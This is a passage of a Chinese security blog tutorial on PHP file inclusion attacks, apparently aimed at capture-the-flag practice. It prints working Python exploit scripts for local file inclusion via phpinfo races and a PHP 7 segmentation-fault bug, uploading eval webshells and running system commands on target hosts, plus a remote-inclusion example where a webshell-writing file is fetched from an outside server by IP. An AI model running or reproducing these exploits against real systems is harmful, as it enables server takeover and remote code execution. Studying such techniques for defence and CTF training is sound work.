string">""</span></pre></td></tr><tr><td data-num="103"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="104"></td><td><pre>        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre>        d <span class="token operator">+=</span> i</pre></td></tr><tr><td data-num="106"></td><td><pre>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="107"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="108"></td><td><pre>        <span class="token comment"># detect the final chunk</span></pre></td></tr><tr><td data-num="109"></td><td><pre>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0rnrn"</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="110"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="111"></td><td><pre>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="113"></td><td><pre>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="114"></td><td><pre>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="115"></td><td><pre></pre></td></tr><tr><td data-num="116"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="117"></td><td><pre>    <span class="token comment"># padded up a bit</span></pre></td></tr><tr><td data-num="118"></td><td><pre>    <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">256</span></pre></td></tr><tr><td data-num="119"></td><td><pre></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="121"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span></pre></td></tr><tr><td data-num="122"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span></pre></td></tr><tr><td data-num="123"></td><td><pre></pre></td></tr><tr><td data-num="124"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="125"></td><td><pre>        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="126"></td><td><pre>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="127"></td><td><pre></pre></td></tr><tr><td data-num="128"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="129"></td><td><pre>        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="130"></td><td><pre>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="131"></td><td><pre>        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="132"></td><td><pre>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="133"></td><td><pre></pre></td></tr><tr><td data-num="134"></td><td><pre>    port <span class="token operator">=</span> <span class="token number">80</span></pre></td></tr><tr><td data-num="135"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="136"></td><td><pre>        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="137"></td><td><pre>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="138"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="139"></td><td><pre>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="140"></td><td><pre>        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="141"></td><td><pre>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="142"></td><td><pre></pre></td></tr><tr><td data-num="143"></td><td><pre>    poolsz <span class="token operator">=</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="144"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="145"></td><td><pre>        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="146"></td><td><pre>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="147"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="148"></td><td><pre>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="149"></td><td><pre>        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="150"></td><td><pre>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="151"></td><td><pre></pre></td></tr><tr><td data-num="152"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="153"></td><td><pre>    reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="154"></td><td><pre>    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="155"></td><td><pre>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="156"></td><td><pre></pre></td></tr><tr><td data-num="157"></td><td><pre>    maxattempts <span class="token operator">=</span> <span class="token number">1000</span></pre></td></tr><tr><td data-num="158"></td><td><pre>    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="159"></td><td><pre>    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="160"></td><td><pre></pre></td></tr><tr><td data-num="161"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz</pre></td></tr><tr><td data-num="162"></td><td><pre>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="163"></td><td><pre></pre></td></tr><tr><td data-num="164"></td><td><pre>    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="165"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="166"></td><td><pre>        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="167"></td><td><pre></pre></td></tr><tr><td data-num="168"></td><td><pre>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="169"></td><td><pre>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="170"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="171"></td><td><pre>        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="172"></td><td><pre>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="173"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="174"></td><td><pre>            <span class="token keyword">with</span> l<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="175"></td><td><pre>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="176"></td><td><pre>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="177"></td><td><pre>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="178"></td><td><pre>                    <span class="token keyword">break</span></pre></td></tr><tr><td data-num="179"></td><td><pre>        <span class="token keyword">print</span></pre></td></tr><tr><td data-num="180"></td><td><pre>        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="181"></td><td><pre>            <span class="token keyword">print</span> <span class="token string">"Woot!  m/"</span></pre></td></tr><tr><td data-num="182"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="183"></td><td><pre>            <span class="token keyword">print</span> <span class="token string">":("</span></pre></td></tr><tr><td data-num="184"></td><td><pre>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="185"></td><td><pre>        <span class="token keyword">print</span> <span class="token string">"nTelling threads to shutdown..."</span></pre></td></tr><tr><td data-num="186"></td><td><pre>        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="187"></td><td><pre></pre></td></tr><tr><td data-num="188"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span></pre></td></tr><tr><td data-num="189"></td><td><pre>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="190"></td><td><pre>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="191"></td><td><pre></pre></td></tr><tr><td data-num="192"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="193"></td><td><pre>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>Getshell</p><p>利用 ph 牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如上传的恶意文件内容 **、**phpinfo.php 和 index.php 相应文件的文件名和位置、系统临时文件写入目录等</p><p>运行脚本 Getshell</p><blockquote><p>python2 <span class="exturl" data-url="aHR0cDovL2V4cC5weQ==">exp.py</span> host port phpinforeq (一般填 200)</p></blockquote><p>修改脚本之后，运行即可包含生成我们精心设置好的 /tmp/Qftm 后门文件</p><p>所以说临时文件包含关键点就是获取到临时文件的名字。</p><p>但如果不能利用 phpinfo ()，该怎么办呢？</p><p>这里可以用 <code>php7 segment fault</code> 特性（<span class="exturl" data-url="aHR0cHM6Ly9idWdzLnBocC5uZXQvYnVnLnBocD9pZD03NTUzNQ==">CVE-2018-14884</span>）进行 Bypass。</p><p>php 代码中使用 php://filter 的 <code>strip_tags</code> 过滤器，可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行，导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像 phpinfo 那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p><p>官方在 PHP Version 7.0.28 时已经修复该漏洞</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>http<span class="token punctuation">:</span><span class="token comment">//192.33.6.145/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span></pre></td></tr></table></figure><p>这种 包含 会导致 php 执行过程中出现 segment fault，此时 上传文件，临时文件会被保存在 <code>upload_tmp_dir</code> 所指定的目录下，不会被删除，这样就能达成 getshell 的目的。</p><blockquote><p>利用条件</p><p>7.0.0 &lt;= PHP Version &lt; 7.0.28</p></blockquote><p>测试一下：</p><p>index.php</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">include</span> <span class="token variable">$a</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="5"></td><td><pre>1234</pre></td></tr></table></figure><p>dir.php</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="5"></td><td><pre>1234</pre></td></tr></table></figure><p>测试环境</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">PHP</span> Version <span class="token number">7.0</span><span class="token number">.9</span></pre></td></tr></table></figure><p>string.strip_tags 过滤器导致出现 php segment fault</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>index<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/string.strip_tags/resource=index.php</span></pre></td></tr></table></figure><p>此时 上传文件，临时文件会被保存在 <code>upload_tmp_dir</code> 所指定的目录下，从而不会被删除，一直存储在服务器的临时目录里面。</p><p>可以通过 <code>dir.php</code> 辅助查找生成的临时文件</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#python version 2.7</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'&lt;?php eval($_REQUEST[Qftm]);'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>url1 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/index.php?file=php://filter/string.strip_tags/resource=index.php'</span></pre></td></tr><tr><td data-num="11"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>url2 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/dir.php?dir=/tmp/'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"php[a-zA-Z0-9]&#123;1,&#125;"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">print</span> data</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>url3<span class="token operator">=</span><span class="token string">'http://192.168.68.119/index.php?file=/tmp/'</span><span class="token operator">+</span>data</pre></td></tr><tr><td data-num="22"></td><td><pre>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token string">'Qftm'</span><span class="token punctuation">:</span><span class="token string">"system('whoami');"</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>r <span class="token operator">=</span>  requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url3<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span> r<span class="token punctuation">.</span>content</pre></td></tr></table></figure><p>windows 网络攻击环境下的脚本编写</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#python version 2.7</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'&lt;?php eval($_REQUEST[Qftm]);'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>url1 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php'</span></pre></td></tr><tr><td data-num="11"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>url2 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/web/fi/dir.php?dir=C:/Windows/'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"php[a-zA-Z0-9]&#123;1,&#125;"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">print</span> data</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>url3<span class="token operator">=</span><span class="token string">'http://192.168.68.119/web/fi/index.php?file=C:/Windows/'</span><span class="token operator">+</span>data<span class="token operator">+</span><span class="token string">'.tmp'</span></pre></td></tr><tr><td data-num="22"></td><td><pre>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token string">'Qftm'</span><span class="token punctuation">:</span><span class="token string">"system('whoami');"</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>r <span class="token operator">=</span>  requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url3<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span> r<span class="token punctuation">.</span>content</pre></td></tr></table></figure><p>或者可以使用工具破解：</p><p>几款好用的 Fuzz 工具</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>基于Go开发：gobuster     https<span class="token punctuation">:</span><span class="token comment">//github.com/OJ/gobuster</span></pre></td></tr><tr><td data-num="2"></td><td><pre>基于Java开发：dirbuster  <span class="token constant">OWASP</span>杰出工具 kali自带</pre></td></tr><tr><td data-num="3"></td><td><pre>基于Python开发：wfuzz    https<span class="token punctuation">:</span><span class="token comment">//github.com/xmendez/wfuzz</span></pre></td></tr></table></figure><p>本地文件包含目前能想到的只有这么多，等后续遇到新的包含方式再补充。</p><p>如有欠缺，还请多多包涵！</p><h2 id="远程文件包含"><a class="anchor" href="#远程文件包含">#</a> 远程文件包含</h2><p>当我们不知道对方服务器有哪些文件，我们可以利用远程包含漏洞，将自己服务器上的文件下载到被人的服务器上。</p><p>这个目前在比赛中遇见的少，毕竟使用条件比较苛刻。</p><h3 id="利用条件-3"><a class="anchor" href="#利用条件-3">#</a> 利用条件</h3><blockquote><p>1. 在 php.ini 中需要 allow_url_include = on 和 allow_url_fopen= on</p><p>2. 所需的远程文件后缀不能与目标服务器的语言相同，如目标服务器解析 PHP 代码，则远程文件后缀不能为.php。</p><p>让我解释一下第二点，如果你的远程文件具有.php 后缀，并且你的远程文件内容如下所示：</p><p>&lt;? php phpinfo ();</p><p>那么在远程服务器执行 phpinfo () 之后，你就可以获得目标服务器的内容。由于它不会运行代码，所以包含的信息不是目标服务器，而是远程服务器。</p></blockquote><p>使用远程文件包含首先你得有个服务器，并且要开启服务，这样别人才能访问到你写的文件。</p><h3 id="举个例子"><a class="anchor" href="#举个例子">#</a> 举个例子</h3><p>我在我的服务器上开启了 apache 服务，并且在其中有个 pika.txt 的文件，里面存在写好的 shell：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php eval(\$_POST['123'])?>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">echo</span> <span class="token string double-quoted-string">"大佬！木马已生成。 "</span><span class="token punctuation">;</span>    </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p><img data-src="../../images/Iknowyouwillstop/31.png" alt="31"></p><p>然后就可以利用 http、ftp 协议来进行远程文件包含。</p><p>常见形式就是？file=http://1.94.24.55/pika.txt</p><p>或者？file=ftp://1.94.24.55/pika.txt</p><p>在特定条件下，gopher 协议、file 协议也能起到作用。</p><div class="tags"><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"><i class="ic i-tag"></i> 文件包含</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2024-01-04 20:17:39" itemprop="dateModified" datetime="2024-01-04T20:17:39+08:00">2024-01-04</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="p1kap1 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="p1kap1 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="p1kap1 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>p1kap1 <i class="ic i-at"><em>@</em></i>P1kap1</li><li 